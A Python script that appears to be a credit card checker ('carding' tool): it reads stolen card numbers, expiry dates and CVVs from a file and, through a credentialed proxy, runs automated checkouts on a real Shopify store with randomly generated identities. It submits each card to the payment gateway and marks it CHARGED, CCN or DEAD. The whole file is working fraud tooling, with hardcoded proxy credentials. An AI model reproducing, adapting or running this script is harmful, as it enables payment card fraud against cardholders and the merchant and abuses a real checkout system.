import requests
from parse import parse
import re
import random
import json
import string
from bs4 import BeautifulSoup
import time
from requests.auth import HTTPProxyAuth
import webbrowser
import threading
import queue

RED = "\033[91m"
GREEN = "\033[91m"
line_index_lock = threading.Lock()

def process_lines(queue, bot_number):
    while True:
        try:
            line = queue.get_nowait().strip()
        except queue.Empty:
            # Queue is empty, break the loop
            break

        # Extract cc, month, year, and cvv
        CNUBR, MONTH, YEAR, CVV = map(str.strip, line.split('|'))

        CNUBRstr = str(CNUBR)
        montht = MONTH.replace('0',"")
        b = CNUBRstr[:4]
        c = CNUBRstr[4:8]
        d = CNUBRstr[8:12]
        e = CNUBRstr[12:] 
        sessions=requests.session()
        proxy_url = f"http://qqk9da986ugmo7q:92m10sgz8cuunkr@rp.proxyscrape.com:6060"
        proxy = {
        "http": proxy_url,
        "https": proxy_url,
}
        url = "https://evolvetogether.com/cart/34330523467916:1?traffic_source=buy_now"
        response = sessions.get(url, allow_redirects=True, proxies=proxy)


        final_url = response.url


        template = "https://evolvetogether.com/{shop_id}/checkouts/{location}?traffic_source=buy_now"
        result = parse(template, final_url)
        received_cookies = response.cookies.get_dict()

        if result:
         shop_id = result['shop_id']
         location_value = result['location']

        else:
         print("Pattern not found in the URL.")
        new_url = f"https://evolvetogether.com/{shop_id}/checkouts/{location_value}"
        first = sessions.get(new_url, proxies=proxy)
        if "recaptcha-response" in first.text:
            print("Error: Recaptcha detected")
        else:
            # Continue with the rest of your logic
            pass
        pattern = pattern = fr'<form data-customer-information-form="true" data-email-or-phone="false" class="edit_checkout" novalidate="novalidate" action="/{shop_id}/checkouts/{location_value}" accept-charset="UTF-8" method="post">\s*<input type="hidden" name="_method" value="patch" autocomplete="off" />\s*<input type="hidden" name="authenticity_token" value="(?P<token>[^"]+)"'

# Use re.search to find the match
        match = re.search(pattern, first.text)

        if match:
         authenticity_token = match.group('token')

        else:
         print("Pattern not found in the HTML response.")

        num = random.randint(100, 99999)


        payload = {
    "query": "query prediction($query: String, $countryCode: AutocompleteSupportedCountry!, $locale: String!, $sessionToken: String, $location: LocationInput) {\n predictions(query: $query, countryCode: $countryCode, locale: $locale, sessionToken: $sessionToken, location: $location) {\n addressId\n description\n completionService\n matchedSubstrings {\n length\n offset\n }\n }\n }",
    "variables": {
        "location": {"latitude": 10.072599999999994, "longitude": -69.3207},
        "query": f"{num} Oregon",
        "sessionToken": "f20d60536117c14d5b830fc021ffc083-1686770213328",
        "countryCode": "US",
        "locale": "EN-US"
    }
}
        json_payload = json.dumps(payload)

        atlas1 = "https://atlas.shopifysvc.com/graphql"
        headers = {
    "Connection": "keep-alive",
    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    "Accept": "*/*",
    "Content-Type": "application/json",
    "sec-ch-ua-mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "sec-ch-ua-platform": '"Windows"',
    "Origin": "https://checkout.shopify.com",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "es-ES,es;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": str(len(json_payload))
}

        response = sessions.post(atlas1, data=json_payload, headers=headers, proxies=proxy)
        json_response = response.json()

    # Extract addressId from the parsed JSON
        try:
            address_id = json_response["data"]["predictions"][0]["addressId"]

        except (KeyError, IndexError):
            print("Unable to extract addressId from the response")

        atlas2 = "https://atlas.shopifysvc.com/graphql"
        second_payload = {
    "query": "query details($locationId: String!, $locale: String!, $sessionToken: String) {\n address(id: $locationId, locale: $locale, sessionToken: $sessionToken) {\n address1\n address2\n city\n zip\n country\n province\n provinceCode\n latitude\n longitude\n }\n }",
    "variables": {
        "locationId": address_id,
        "locale": "EN-US",
        "sessionToken": "f20d60536117c14d5b830fc021ffc083-1686770558673"
    }
}
        json_second_payload = json.dumps(second_payload)
        response2 = sessions.post(atlas2, data=json_second_payload, headers=headers, proxies=proxy)
        received_cookies11 = response2.cookies.get_dict()
        json_response2 = response2.json()
        try:
           address1 = json_response2["data"]["address"]["address1"]
           city = json_response2["data"]["address"]["city"]
           zip_code = json_response2["data"]["address"]["zip"]
           province_code = json_response2["data"]["address"]["provinceCode"]


        except (KeyError, TypeError):
            print("Unable to extract desired fields from the response")

        def generate_random_alphabet_string(length):
            alphabet_string = string.ascii_lowercase  # lowercase alphabets
            random_string = ''.join(random.choice(alphabet_string) for _ in range(length))
            return random_string

    # Example: Generate a random alphabet string of length 10
        fname = generate_random_alphabet_string(7)


        lname = generate_random_alphabet_string(7)


        mail = fname + "@gmail.com"
        pnum = random.randint(100, 999)
        unum = random.randint(1000, 9999)
        fnum = str(pnum)
        gnum = str(unum)
        phonenum = "%28786%29"+"+" + fnum + "-" + gnum


        addressu = address1.replace(' ', '+')

        cityu = city

        payload3 = {
    "_method": "patch",
    "authenticity_token": authenticity_token,
    "previous_step": "contact_information",
    "step": "payment_method",
    "checkout[email]": mail,
    "checkout[buyer_accepts_marketing]": "0",
    "checkout[billing_address][first_name]": "bsg",
    "checkout[billing_address][last_name]": "op",
    "checkout[billing_address][company]": "",
    "checkout[billing_address][address1]": addressu,
    "checkout[billing_address][address2]": "",
    "checkout[billing_address][city]": city,
    "checkout[billing_address][country]": "US",
    "checkout[billing_address][province]": province_code,
    "checkout[billing_address][zip]": zip_code,
    "checkout[billing_address][phone]": "",
    "checkout[billing_address][country]": "United States",
    "checkout[billing_address][first_name]": "bsg",
    "checkout[billing_address][last_name]": "op",
    "checkout[billing_address][company]": "",
    "checkout[billing_address][address1]": addressu,
    "checkout[billing_address][address2]": "",
    "checkout[billing_address][city]": city,
    "checkout[billing_address][province]": province_code,
    "checkout[billing_address][zip]": zip_code,
    "checkout[billing_address][phone]": phonenum,
    "checkout[remember_me]": "",
    "checkout[remember_me]": "0",
    "checkout[client_details][browser_width]": "1903",
    "checkout[client_details][browser_height]": "911",
    "checkout[client_details][javascript_enabled]": "1",
    "checkout[client_details][color_depth]": "24",
    "checkout[client_details][java_enabled]": "false",
    "checkout[client_details][browser_tz]": "-330",
}


        response3 = sessions.post(new_url, data=payload3, allow_redirects=True,  proxies=proxy)
        received_cookies2 = response3.cookies.get_dict()
        pmurl = new_url + "?previous_step=contact_information&step=payment_method"

        pmmethod= sessions.get(pmurl,  proxies=proxy)
        received_cookies22 = pmmethod.cookies.get_dict()

        soup = BeautifulSoup(pmmethod.text, 'html.parser')
        gateway_element = soup.find(attrs={'data-select-gateway': True})
        if gateway_element:
    # Get the value of data-select-gateway
         gateway = gateway_element['data-select-gateway']


        else:
         print("Element with data-select-gateway attribute not found")
        pricet_element = soup.find(attrs={'data-checkout-payment-due-target': True})
        if pricet_element:
    # Get the value of data-select-gateway
         pricet = pricet_element['data-checkout-payment-due-target']


        else:
         print("Element with data-checkout-payment-due-target attribute not found")





        checkout1 = "https://deposit.us.shopifycs.com/sessions"
        payload4_temp = {
        "credit_card": {
        "number": b + " " + c + " " +d+ " " + e,
        "name": "ROBERT CASTILLO",
        "month": montht,
        "year": YEAR,
        "verification_value": CVV,
    },
    "payment_session_scope": "evolvetogether.com"
}

        headers_last = {
    "Host": "deposit.us.shopifycs.com",
    "Connection": "keep-alive",
    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    "Accept": "application/json",
    "Content-Type": "application/json",
    "sec-ch-ua-mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "sec-ch-ua-platform": '"Windows"',
    "Origin": "https://checkout.shopifycs.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://checkout.shopifycs.com/",
    "Accept-Language": "es-ES,es;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "167",
 }

        response4= sessions.post(checkout1, json=payload4_temp,  proxies=proxy, headers=headers_last)
        received_cookies3 = response4.cookies.get_dict()
        if response4.status_code == 200:
        # Parse the JSON response
         data = json.loads(response4.text)

        # Extract the "id" field
        if "id" in data:
            parsed_id = data["id"]




        payload_final = f"_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={parsed_id}&checkout%5Bpayment_gateway%5D={gateway}&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bpost_purchase_page_requested%5D=0&checkout%5Btotal_price%5D={pricet}&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240"
        post_final = sessions.post(url= new_url, data=payload_final,  proxies=proxy)
        received_cookies4 = post_final.cookies.get_dict()
        headersfinal = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Host": "www.evolvetogether.com",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Referer": "https://www.evolvetogether.com/",
    "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate",
 }
        time.sleep(10)
        response_final_site = new_url + "?from_processing_page=1&validate=true"
        response_final = sessions.get(response_final_site, proxies=proxy)

        if any(keyword in response_final.text for keyword in ["Thank you for your purchase!", "Your order is confirmed", "Thank you"]):
         response_text = f'''     {GREEN}CHARGED
     ➤ CC:  {line}
     ➤ Response:  Charged ✅ BY  @ADSBINFREE
     ➤ Gate : Shopify gateway '''
        elif any(keyword in response_final.text for keyword in ["Security code was not matched by the processor", "Security codes does not match correct", "CVV mismatch", "CVV2 Mismatch"]):
         response_text = f'''     {GREEN}CCN 
     ➤ CC:  {line}
     ➤ Response: Card security code is incorrect ✅ BY  @ADSBINFREE
     ➤ Gate : Shopify gateway '''

        else:
          soup = BeautifulSoup(response_final.content, 'html.parser')
          error_element = soup.find('p', {'class': 'notice__text'})

          if error_element:
            error = error_element.text
            response_text = f'''     {RED}DEAD 
        ➤ CC:  {line} ➤ Response: {error} - '''
          else:
            response_text = f'''DEAD 
         ➤ CC:  {line} 
         ➤ Response: Error element not found in the HTML - 
         ➤ Gate : Shopify gateway'''



        print(response_text)


file_path = 'cc.txt'
with open(file_path, 'r') as file:
    # Read all lines from the file
    lines = file.readlines()

# Set up a queue to share lines among threads
lines_queue = queue.Queue()
for line in lines:
    lines_queue.put(line)

# Set the number of bots you want to run
num_bots = 1

# Create and start threads for each bot
threads = []
for i in range(num_bots):
    thread = threading.Thread(target=process_lines, args=(lines_queue, i+1))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("All bots have completed")


# Assuming make_response is a function that processes the response further


#this is to see the resp on chrome


# if response_final.status_code == 200:
#     # Open the response page in the default web browser
#     with open("response_final_page.html", "w", encoding="utf-8") as f:
#         f.write(response_final.text)

#     webbrowser.open("response_final_page.html")
# else:
#     print(f"Request failed with status code: {response_final.status_code}")
#     print(response_final.text)